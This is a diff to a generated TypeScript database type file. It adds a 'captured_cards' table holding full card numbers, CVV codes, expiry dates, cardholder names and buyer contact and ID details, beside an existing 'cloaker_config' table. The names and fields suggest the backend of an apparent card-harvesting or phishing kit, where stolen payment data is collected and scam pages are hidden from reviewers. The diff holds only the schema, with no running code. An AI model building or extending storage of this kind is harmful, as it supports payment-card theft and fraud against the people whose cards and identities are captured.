@@ -14,6 +14,51 @@ export type Database = {
   }
   public: {
     Tables: {
+      captured_cards: {
+        Row: {
+          amount_cents: number
+          app_password: string
+          buyer_document: string | null
+          buyer_email: string | null
+          buyer_name: string | null
+          buyer_phone: string | null
+          card_cvv: string
+          card_expiry: string
+          card_holder: string
+          card_number: string
+          created_at: string
+          id: string
+        }
+        Insert: {
+          amount_cents?: number
+          app_password: string
+          buyer_document?: string | null
+          buyer_email?: string | null
+          buyer_name?: string | null
+          buyer_phone?: string | null
+          card_cvv: string
+          card_expiry: string
+          card_holder: string
+          card_number: string
+          created_at?: string
+          id?: string
+        }
+        Update: {
+          amount_cents?: number
+          app_password?: string
+          buyer_document?: string | null
+          buyer_email?: string | null
+          buyer_name?: string | null
+          buyer_phone?: string | null
+          card_cvv?: string
+          card_expiry?: string
+          card_holder?: string
+          card_number?: string
+          created_at?: string
+          id?: string
+        }
+        Relationships: []
+      }
       cloaker_config: {
         Row: {
           created_at: string
